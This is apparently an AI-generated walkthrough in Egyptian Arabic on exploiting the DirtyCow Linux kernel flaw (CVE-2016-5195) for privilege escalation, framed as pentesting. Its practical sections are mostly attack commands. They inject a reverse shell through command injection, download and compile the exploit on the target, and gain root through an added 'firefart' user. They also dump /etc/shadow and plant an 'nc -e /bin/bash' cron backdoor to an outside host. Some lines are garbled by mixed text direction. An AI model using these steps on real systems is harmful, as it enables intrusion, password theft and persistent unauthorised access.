تمام، هشرح لك "Linux Kernel Exploits DirtyCow (CVE-2016-5195)" بعمق شديد، مع تركيز على الجانب العملي، الأوامر، والأكواد. هخلّص كل جزء بالعامية المصرية زي ما تكون بتسمع من صاحبك، وفي الآخر هقدم خطوات عملية للاستغلال في سياق Pentesting.

---

### **1. إيه هو DirtyCow (CVE-2016-5195)؟**

#### **الشرح العميق:**
DirtyCow هو ثغرة في نواة لينكس (Linux Kernel) اكتشفت سنة 2016 ورقمها CVE-2016-5195. الثغرة دي بتستغل مشكلة في طريقة إدارة الذاكرة (Memory Management) في النظام، وبالأخص في ميزة تسمى "Copy-on-Write" (COW). الفكرة إنك لو كنت مستخدم عادي (Low Privilege User)، تقدر تستغل الثغرة دي عشان تكتب في ملفات المفروض تكون للقراءة بس (Read-Only) أو محمية، زي ملفات النظام المهمة (`/etc/passwd` مثلًا). الهدف الأساسي هو تصعيد الصلاحيات (Privilege Escalation) لتصير `root`.

- **إزاي بتشتغل؟** الثغرة بتستغل حالة سباق (Race Condition) بين الكتابة في الذاكرة وتعديل الملفات، فتقدر تغير محتوى ملفات النظام.
- **الإصدارات المتأثرة:** Kernel من 2.6.22 لحد 4.8.3 (يعني أنظمة قديمة قبل التحديثات بتاعة 2016).

#### **الأدوات والأوامر العملية:**
1. **فحص إصدار الkernel:**
   - `uname -r` ->  يبقى متأثر.c`3.2.0-23-generic` لو رجع مثلًا
1. **تحميل Exploit:**
   - `wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirty.c`.
3. **تجميع الكود:**
   - `gcc -pthread dirty.c -o dirtycow`.

#### **خلاصة بالعامية المصرية:**
"يعني زي ما تكون لقيت خرم في حيطة السجن، تدخل منه وتطلع الكبير بتاع الحبس! DirtyCow يعني بتستغل عيب في النظام عشان تكتب في حاجات المفروض ماتقربلهاش وتبقى root."

---

### **2. ليه المشكلة دي خطيرة؟**

#### **الشرح العميق:**
الثغرة دي خطيرة جدًا لأنها بتدي مستخدم عادي (زي `www-data` مثلًا) القدرة يتحكم في النظام كله عن طريق تعديل ملفات مهمة. يعني:
- **تصعيد صلاحيات:** تقدر تضيف نفسك كـ root أو تغير كلمات سر.
- **تدمير النظام:** لو عايز تخرب، تغير ملفات النظام الأساسية.
- **وصول دائم:** تضيف Backdoor عشان ترجع تاني.

في الـ Pentesting، لو لقيت سيرفر قديم متأثر بـ DirtyCow، ده يعني إنك ممكن تاخد root في دقايق من غير تعقيد.

#### **الأدوات والأوامر العملية:**
1. **تشغيل الـ Exploit:**
   - `./dirtycow`  .->root ويضيف مستخدم جديد بصلاحيات `/etc/passwd`  بيعدل ملف زي
1. **التحقق:**
   - `id` -> يبقى نجحت.`uid=0(root)` لو رجع 
   - ، 
1. **مثال يدوي:**
   - لو عندك Shell كـ `www-data`:
     - `echo "hacker:x:0:0:root:/root:/bin/bash" >> /etc/passwd` (عادةً ما ينفعش، بس DirtyCow بيخلّيه ينفع).

#### **خلاصة بالعامية المصرية:**
"الثغرة دي خطيرة لأنها زي ما تكون لقيت مفتاح السجن في الزبالة، فتحت الباب وطلعت الباشا بتاع الكل! لو لقيتها، يبقى النظام في إيدك في ثواني."

---

### **3. إزاي نستغلها في الـ Pentesting؟**
- **الهدف:** تستخدم DirtyCow عشان تصعد من مستخدم عادي لـ root عن طريق تعديل ملفات النظام.
- **مثال واقعي:** لو وصلت لـ Shell كـ `www-data` على سيرفر قديم، تشغل الـ Exploit وتبقى root.

#### **خلاصة بالعامية المصرية:**
"لما تلاقي DirtyCow، زي ما تكون لقيت عصاية سحرية في لعبة، تضرب بيها وتبقى الكبير بتاع الماتش في ثانية!"

---

### **خطوات عملية للاستغلال في Pentesting**

#### **الخطوة 1: فحص الهدف**
- شغل Nmap:
  - `nmap -sV 192.168.1.10`.
- افترض النتيجة:
  - Port 80: Apache 2.4.29 -> لو وصلت لـ Shell، ابدأ.

#### **الخطوة 2: الوصول لـ Shell**
- لو لقيت ثغرة ويب (زي Command Injection):
  - `http://192.168.1.10/ping?ip=127.0.0.1; /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1`.
  - `nc -lvnp 4444` -> Shell -> `id` -> `www-data`.

#### **الخطوة 3: التحقق من الكernel**
- في الـ Shell:
  - `uname -r` -> لو رجع `3.16.0-38-generic` (مثلاً)، يبقى متأثر بـ DirtyCow.

#### **الخطوة 4: تحميل وتشغيل DirtyCow**
- انقل الـ Exploit للسيرفر:
  - في جهازك: `python3 -m http.server 80`.
  - في الـ Shell: `wget http://192.168.1.100/dirty.c -O /tmp/dirty.c`.
- جمّع الكود:
  - `gcc -pthread /tmp/dirty.c -o /tmp/dirtycow`.
- شغله:
  - `./tmp/dirtycow` -> غالبًا بيضيف مستخدم جديد زي `firefart` بصلاحيات root.

#### **الخطوة 5: التحقق من التصعيد**
- `cat /etc/passwd` -> لو لقيت سطر زي `firefart:x:0:0::/:/bin/sh`.
- `su firefart` -> لو طلب كلمة سر (عادةً `firefart`)، ادخلها.
- `id` -> `uid=0(root)` -> نجحت.

#### **الخطوة 6: استغلال وتوثيق**
- كـ root:
  - `cat /etc/shadow` -> تسريب كلمات السر.
  - `echo "nc -e /bin/bash 192.168.1.100 9999" > /etc/cron.d/backdoor` -> Backdoor.
- سجل الإصدار المتأثر والخطوات في تقريرك.

#### **خلاصة بالعامية المصرية:**
"الخطوات دي زي ما تكون لقيت سلاح في لعبة، ضربت بيه الكل، وطلعت الكبير بتاع الحتة! DirtyCow لما تلاقيها، يبقى النظام في جيبك في دقايق."

---

### **الخلاصة النهائية:**
DirtyCow (CVE-2016-5195) هي ثغرة خطيرة في نواة لينكس بتخلّيك تصعد من مستخدم عادي لـ root عن طريق استغلال عيب في الذاكرة. في الـ Pentesting، دور عليها في الأنظمة القديمة بـ `uname -r`، استخدم الـ Exploit عشان تاخد Shell كـ root، ووري العميل إن سيرفره زي بيت مكسور لو ما حدثش! بالطريقة دي، تبقى البطل بتاع اللعبة بسهولة!
